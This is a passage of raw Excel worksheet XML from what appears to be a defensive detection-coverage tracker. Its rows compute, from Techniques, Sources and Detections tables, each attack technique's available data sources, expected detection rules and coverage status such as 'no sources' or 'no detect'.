        <f t="array" ref="G47">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H47" s="9" t="str" cm="1">
        <f t="array" ref="H47">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I47" s="9" t="str" cm="1">
        <f t="array" ref="I47">IF(SUM(IF($C47=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C47=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J47" s="9" t="str" cm="1">
        <f t="array" ref="J4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7" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M47" s="9" cm="1">
        <f t="array" ref="M47">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N47" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O47" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P47" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S4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7" t="s">
        <v>386</v>
      </c>
      <c r="U47" t="s">
        <v>560</v>
      </c>
      <c r="W47" t="b">
        <v>1</v>
      </c>
      <c r="X47" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="48" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A48" t="s">
        <v>525</v>
      </c>
      <c r="B48" t="s">
        <v>561</v>
      </c>
      <c r="C48" t="s">
        <v>562</v>
      </c>
      <c r="D48" t="s">
        <v>6</v>
      </c>
      <c r="E48" t="s">
        <v>531</v>
      </c>
      <c r="F48" s="9">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="G48" s="9" cm="1">
        <f t="array" ref="G48">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H48" s="9" t="str" cm="1">
        <f t="array" ref="H48">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I48" s="9" t="str" cm="1">
        <f t="array" ref="I48">IF(SUM(IF($C48=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C48=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J48" s="9" t="str" cm="1">
        <f t="array" ref="J4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8" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M48" s="9" cm="1">
        <f t="array" ref="M48">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N48" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O48" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P48" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S4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8" t="s">
        <v>425</v>
      </c>
      <c r="U48" t="s">
        <v>563</v>
      </c>
      <c r="W48" t="b">
        <v>1</v>
      </c>
      <c r="X48" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="49" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A49" t="s">
        <v>525</v>
      </c>
      <c r="B49" t="s">
        <v>564</v>
      </c>
      <c r="C49" t="s">
        <v>565</v>
      </c>
      <c r="D49" t="s">
        <v>6</v>
      </c>
      <c r="E49" t="s">
        <v>566</v>
      </c>
      <c r="F49" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G49" s="9" cm="1">
        <f t="array" ref="G49">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H49" s="9" t="str" cm="1">
        <f t="array" ref="H49">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I49" s="9" t="str" cm="1">
        <f t="array" ref="I49">IF(SUM(IF($C49=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C49=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J49" s="9" t="str" cm="1">
        <f t="array" ref="J4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9" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M49" s="9" cm="1">
        <f t="array" ref="M49">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N49" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O49" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P49" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S4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9" t="s">
        <v>368</v>
      </c>
      <c r="U49" t="s">
        <v>567</v>
      </c>
      <c r="W49" t="b">
        <v>1</v>
      </c>
      <c r="X49" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="50" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A50" t="s">
        <v>525</v>
      </c>
      <c r="B50" t="s">
        <v>568</v>
      </c>
      <c r="C50" t="s">
        <v>279</v>
      </c>
      <c r="D50" t="s">
        <v>6</v>
      </c>
      <c r="E50" t="s">
        <v>569</v>
      </c>
      <c r="F50" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G50" s="9" cm="1">
        <f t="array" ref="G50">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H50" s="9" t="str" cm="1">
        <f t="array" ref="H50">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I50" s="9" t="str" cm="1">
        <f t="array" ref="I50">IF(SUM(IF($C50=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C50=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J50" s="9" t="str" cm="1">
        <f t="array" ref="J5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0" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M50" s="9" cm="1">
        <f t="array" ref="M50">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N50" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O50" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P50" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S5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0" t="s">
        <v>368</v>
      </c>
      <c r="U50" t="s">
        <v>570</v>
      </c>
      <c r="W50" t="b">
        <v>1</v>
      </c>
      <c r="X50" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="51" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A51" t="s">
        <v>525</v>
      </c>
      <c r="B51" t="s">
        <v>571</v>
      </c>
      <c r="C51" t="s">
        <v>572</v>
      </c>
      <c r="D51" t="s">
        <v>6</v>
      </c>
      <c r="E51" t="s">
        <v>573</v>
      </c>
      <c r="F51" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G51" s="9" cm="1">
        <f t="array" ref="G51">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H51" s="9" t="str" cm="1">
        <f t="array" ref="H51">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I51" s="9" t="str" cm="1">
        <f t="array" ref="I51">IF(SUM(IF($C51=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C51=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J51" s="9" t="str" cm="1">
        <f t="array" ref="J5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1" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M51" s="9" cm="1">
        <f t="array" ref="M51">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N51" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O51" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P51" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S5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1" t="s">
        <v>407</v>
      </c>
      <c r="U51" t="s">
        <v>574</v>
      </c>
      <c r="W51" t="b">
        <v>1</v>
      </c>
      <c r="X51" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="52" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A52" t="s">
        <v>525</v>
      </c>
      <c r="B52" t="s">
        <v>575</v>
      </c>
      <c r="C52" t="s">
        <v>576</v>
      </c>
      <c r="D52" t="s">
        <v>6</v>
      </c>
      <c r="E52" t="s">
        <v>566</v>
      </c>
      <c r="F52" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G52" s="9" cm="1">
        <f t="array" ref="G52">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H52" s="9" t="str" cm="1">
        <f t="array" ref="H52">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I52" s="9" t="str" cm="1">
        <f t="array" ref="I52">IF(SUM(IF($C52=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C52=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J52" s="9" t="str" cm="1">
        <f t="array" ref="J5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2" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M52" s="9" cm="1">
        <f t="array" ref="M52">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N52" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O52" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P52" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S5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2" t="s">
        <v>386</v>
      </c>
      <c r="U52" t="s">
        <v>577</v>
      </c>
      <c r="V52" t="s">
        <v>578</v>
      </c>
      <c r="W52" t="b">
        <v>1</v>
      </c>
      <c r="X52" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="53" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A53" t="s">
        <v>525</v>
      </c>
      <c r="B53" t="s">
        <v>579</v>
      </c>
      <c r="C53" t="s">
        <v>580</v>
      </c>
      <c r="D53" t="s">
        <v>6</v>
      </c>
      <c r="E53" t="s">
        <v>566</v>
      </c>
      <c r="F53" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G53" s="9" cm="1">
        <f t="array" ref="G53">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H53" s="9" t="str" cm="1">
        <f t="array" ref="H53">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I53" s="9" t="str" cm="1">
        <f t="array" ref="I53">IF(SUM(IF($C53=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C53=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J53" s="9" t="str" cm="1">
        <f t="array" ref="J5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3" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M53" s="9" cm="1">
        <f t="array" ref="M53">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N53" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O53" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P53" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S5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3" t="s">
        <v>368</v>
      </c>
      <c r="U53" t="s">
        <v>581</v>
      </c>
      <c r="W53" t="b">
        <v>1</v>
      </c>
      <c r="X53" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="54" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A54" t="s">
        <v>525</v>
      </c>
      <c r="B54" t="s">
        <v>582</v>
      </c>
      <c r="C54" t="s">
        <v>583</v>
      </c>
      <c r="D54" t="s">
        <v>6</v>
      </c>
      <c r="E54" t="s">
        <v>584</v>
      </c>
      <c r="F54" s="9">
        <f t="shared" si="0"/>
        <v>3</v>
      </c>
      <c r="G54" s="9" cm="1">
        <f t="array" ref="G54">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H54" s="9" t="str" cm="1">
        <f t="array" ref="H54">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I54" s="9" t="str" cm="1">
        <f t="array" ref="I54">IF(SUM(IF($C54=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C54=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J54" s="9" t="str" cm="1">
        <f t="array" ref="J5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4" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M54" s="9" cm="1">
        <f t="array" ref="M54">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N54" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O54" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P54" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S5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4" t="s">
        <v>368</v>
      </c>
      <c r="U54" t="s">
        <v>585</v>
      </c>
      <c r="W54" t="b">
        <v>1</v>
      </c>
      <c r="X54" t="s">
        <v>525</v>
      </c>
    </row>
    <row r="55" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A55" t="s">
        <v>586</v>
      </c>
      <c r="B55" t="s">
        <v>586</v>
      </c>
      <c r="C55" t="s">
        <v>113</v>
      </c>
      <c r="D55" t="s">
        <v>12</v>
      </c>
      <c r="E55" t="s">
        <v>438</v>
      </c>
      <c r="F55" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G55" s="9" cm="1">
        <f t="array" ref="G55">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H55" s="9" cm="1">
        <f t="array" ref="H55">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I55" s="9" t="str" cm="1">
        <f t="array" ref="I55">IF(SUM(IF($C55=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C55=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J55" s="9" t="str" cm="1">
        <f t="array" ref="J5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5" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M55" s="9" cm="1">
        <f t="array" ref="M55">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N55" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O55" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P55" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S5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5" t="s">
        <v>368</v>
      </c>
      <c r="U55" t="s">
        <v>587</v>
      </c>
      <c r="V55" t="s">
        <v>588</v>
      </c>
      <c r="W55" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="56" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A56" t="s">
        <v>589</v>
      </c>
      <c r="B56" t="s">
        <v>589</v>
      </c>
      <c r="C56" t="s">
        <v>37</v>
      </c>
      <c r="D56" t="s">
        <v>12</v>
      </c>
      <c r="E56" t="s">
        <v>438</v>
      </c>
      <c r="F56" s="9">
        <f t="shared" si="0"/>
        <v>2</v>
      </c>
      <c r="G56" s="9" cm="1">
        <f t="array" ref="G56">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H56" s="9" cm="1">
        <f t="array" ref="H56">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I56" s="9" t="str" cm="1">
        <f t="array" ref="I56">IF(SUM(IF($C56=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C56=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J56" s="9" t="str" cm="1">
        <f t="array" ref="J5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6" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M56" s="9" cm="1">
        <f t="array" ref="M56">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N56" s="9">
